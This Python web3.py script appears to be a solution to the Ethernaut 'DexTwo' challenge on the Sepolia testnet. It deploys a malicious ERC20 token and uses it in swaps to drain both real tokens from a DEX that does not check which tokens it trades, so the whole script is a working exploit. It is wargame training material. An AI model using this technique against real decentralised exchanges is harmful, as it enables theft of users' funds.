import os

import solcx
from dotenv import load_dotenv
from web3 import Web3

load_dotenv()

w3 = Web3(Web3.HTTPProvider(os.getenv('PROVIDER_URL')))
if w3.is_connected():
    print("Successfully connected to the provider!")
else:
    print("Failed to connect to the given provider ", os.getenv('PROVIDER_URL'))
    exit()

# Load environment variables
_PRIVATE_KEY = os.getenv('PRIVATE_KEY')
player = w3.to_checksum_address(os.getenv('WALLET'))


def compile_contract(contract_path: str, version: str, contract_name: str = None):
    solcx.set_solc_version(version=version)
    with open(contract_path, 'r') as file:
        contract_source = file.read()
    compiled_sol = solcx.compile_source(contract_source)
    contract_key = f'<stdin>:{contract_name}' if contract_name else next(iter(compiled_sol))
    contract_interface = compiled_sol[contract_key]
    print(f'Compiled {contract_path} for contract {contract_key}')
    return contract_interface


def send_tx(transaction):
    # We have 1-line .transact() for state changes, but it works only if you are using a local node like Ganache, Anvil
    # Or your account is unlocked in the node (like Infura), which is rare in public networks. So we need below steps
    nonce = w3.eth.get_transaction_count(player, 'pending')  # Use pending block tag to include unmined txs
    transaction = transaction.build_transaction({
        'from': player,
        'chainId': 11155111,
        'nonce': nonce
    })
    signed_tx = w3.eth.account.sign_transaction(transaction, private_key=_PRIVATE_KEY)
    txn_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    tx_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)
    assert tx_receipt['status'] == 1
    print(f'Sent transaction with nonce {nonce}: {tx_receipt}')
    return tx_receipt


# Step 1: Load Ethernaut contracts
dex_address = w3.to_checksum_address("")
erc_compiled_contract = compile_contract("./ERC20.sol", '0.8.0', "ERC20")
dex_compiled_contract = compile_contract("./DexTwo.sol", '0.8.0', "DexTwo")
dex = w3.eth.contract(address=dex_address, abi=dex_compiled_contract['abi'])
token1 = w3.eth.contract(address=dex.functions.token1().call(), abi=erc_compiled_contract['abi'])
token2 = w3.eth.contract(address=dex.functions.token2().call(), abi=erc_compiled_contract['abi'])

# Step 2: Deploy a malicious token and mint
mal_compiled_contract = compile_contract("./MaliciousToken.sol", '0.8.0')
mal_token = w3.eth.contract(abi=mal_compiled_contract['abi'], bytecode=mal_compiled_contract['bin'])
receipt = send_tx(mal_token.constructor(1000))
mal_token = w3.eth.contract(address=receipt["contractAddress"], abi=mal_compiled_contract['abi'])
print(f"MalToken deployed at: {mal_token.address}")

# Step 3: Transfer some MAL to the DEX so the DEX holds a balance of your token.
send_tx(mal_token.functions.transfer(dex_address, 1))

# Step 4: Approve the DEX to move MAL on your behalf.
send_tx(mal_token.functions.approve(dex_address, 1000))
print("Approved DEX to move unlimited tokens...")

# Step 5: Swap 1 MAL → token1 (drain it)
send_tx(dex.functions.swap(mal_token.address, token1.address, 1))
assert 0 == token1.functions.balanceOf(dex_address).call()
print("Drained token1")

# Step 6: Swap 1 MAL → token2 (drain it)
# send_tx(mal_token.functions.transfer(dex_address, 1))  # Not needed as DEX already has it
send_tx(dex.functions.swap(mal_token.address, token2.address, 1))
assert 0 == token2.functions.balanceOf(dex_address).call()
print("Drained token2")
print('Well done, You have completed this level!!!')
